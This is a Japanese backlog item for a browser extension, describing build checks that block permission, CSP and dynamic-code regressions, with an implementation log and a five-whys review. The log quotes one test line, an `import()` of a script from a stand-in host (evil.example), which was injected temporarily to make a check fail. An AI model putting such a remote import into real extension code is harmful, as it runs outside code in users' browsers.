# PBI: manifest の権限と CSP の後退を機械検査で止める

## ユーザーストーリー
利用者として、更新で拡張の権限やスクリプト実行方針が黙って広がらないことを望む、なぜなら権限の追加は全サイトでの振る舞いを変え、ストア側の再同意も十分に目立たないから

## 区分
セキュリティ / 1.0 必須

## 優先度
- 順位: 4 / 17
- RICEスコア: 400 (Reach=100 / Impact=1 / Confidence=80% / Effort=0.2人週)
- 根拠: 現在の `permissions: ['storage', 'contextMenus']` と `optional_host_permissions` は最小で良好。正式版はこれを約束として固定する段階。`tests/build/` に検査の土台があり工数が小さい

## BDD受け入れシナリオ

```gherkin
Scenario: 権限を足すとビルド検査が落ちる
  Given 誰かが manifest に必須権限 tabs を足した
  When  make test-build を実行する
  Then  許可リスト外の権限として失敗し、追加には許可リストの更新と理由の記載が要る

Scenario: リモートコードや eval を許す CSP を入れると落ちる
  Given extension_pages の CSP に unsafe-eval か外部 origin が入った
  When  make test-build を実行する
  Then  失敗する

Scenario: バンドルに動的コード実行が混ざると落ちる
  Given 依存更新で dist の JS に new Function や eval が入った
  When  make test-build を実行する
  Then  検出した箇所を示して失敗する
```

## 受け入れ基準
- [x] 両ブラウザの manifest について `permissions` / `optional_permissions` / `host_permissions` / `optional_host_permissions` / `content_scripts.matches` / `web_accessible_resources` / `externally_connectable` を許可リストと完全一致で検査する
- [x] `content_security_policy.extension_pages` は未指定のままブラウザ既定に任せ、指定された場合に `unsafe-eval` / `unsafe-inline` / `wasm-unsafe-eval` / 外部 origin を含まないことを検査する（明示する案は下記の理由で置き換え）
- [x] dist の JS に `eval(` / `new Function(` が無いことを検査（誤検知の例外は理由付きで列挙。現状は 0 件）。外部 URL の `import(` も検査する（2026-11-27 追加。下の実装記録）
- [x] 許可リストの更新には PR テンプレートでストア掲載文・プライバシー文書の更新確認を求める

## テスト戦略
- E2E: なし
- 統合: `tests/build/` に検査を追加し、意図的に権限を足した一時変更で赤を確認
- 単体: なし

## 見積もり
0.2人週（要チームでの見積もり）

## Definition of Done
- [x] 全BDDシナリオが自動テストとして実装されパスする
- [x] コードレビュー完了（Task 2 レビュー Approved。追加分は make check-all で緑を確認。GitHub PR での approve はユーザー作業）
- [x] ドキュメント更新済み（権限の許可リスト更新時の文書確認は PR テンプレートで担保。変更を要する文書はなかった）

## 出どころ
- 2026-11-24 正式版準備の棚卸し。`wxt.config.ts`、`src/entrypoints/content.ts:127`

## 実装記録
- 検査: `tests/build/manifest-guard.build.ts`（両 dist を走査）。`make test-build` 緑
- CSP 判断: Firefox MV3 の既定 CSP は `upgrade-insecure-requests` を含み、明示上書きで既定の挙動が変わる危険があるため、ブラウザ既定に任せて後退だけを止める。受け入れ基準の「明示する」はこの判断で置き換えた
- 誤検知の許可リスト: なし（`eval(` / `new Function(` は両 dist で 0 件）
- 赤確認: dist の manifest に `tabs` を一時追加し、許可リスト検査が失敗することを確認して戻した
- 外部 URL の `import(` の検査は未実装
- タスクレビュー: spec 適合、Approved（Critical/Important なし）。Minor は `.superpowers/sdd/ga-readiness-task-2-review.md`

## 引継ぎ
- 残り 2 点（小）は 2026-11-27 に実装して閉じた（下の実装記録）。残る作業はない

## 実装記録（2026-11-27、残り 2 点の追加）

- JS 走査の対象ファイル数が 0 でないことの assert: `ships no dynamic code execution` の冒頭で `expect(files.length).toBeGreaterThan(0)` を入れた。dist の構成変更で JS が 1 件も無くなった場合、空走査は自明に通るため、通さず落とす。
- 外部 URL の `import(` 検査: 新しい `it` として `ships no dynamic import of a remote URL in bundled JS` を追加。`import(` の直後が `https?://` か `//` で始まる文字列リテラルのときに失敗する。実行時に組み立てられる指定子は静的に解決できないため対象外とし、その限界をコメントに書いた。現行の両 dist は `import(` 自体が 0 件のため誤検知なし。
- 赤確認: chrome-mv3 の background.js に `import("https://evil.example/x.js")` を一時追記して新しい検査が落ちることを確認し、戻した（その後 `make test-build` で dist を再生成）。
- 検証: `npx vitest run tests/build/manifest-guard.build.ts` 8 件緑。全体は `make check-all` で確認する。

### なぜなぜ分析（残り 2 点が先送りされた理由）

1. なぜ未実装のまま requested を受けたか → 実装指示書（Task 2 の brief）にこの 2 点が書かれていなかった
2. なぜ brief に無かったか → brief は PBI 本文の受け入れ基準から起こされたが、基準 3 件目の末尾の注記（「外部 URL の import( は未検査」）が「既知の限界の記録」と読め、「やること」と読めなかった
3. なぜ注記が限界と読めたか → PBI 本文は達成済み項目の説明が主で、未実装の残りが注記の形で本文に埋もれていた
4. なぜ埋もれたか → 受け入れ基準のチェックボックスには注記を置けないため、達成の対照として本文に書くしかなかった
5. なぜその書き方になったか → 受け入れ基準の書式（`- [x]` 項目）に「未実装の残り」を載せる欄がなく、引継ぎ節と二重管理になった
→ 解: 未実装の残りは受け入れ基準の注記に埋めず、引継ぎ節に「やること」として 1 行で列挙する。以降の PBI もこの形に寄せる（本 PBI の引継ぎ節は閉鎖時に処理済みを示す形へ書き換え済み）。
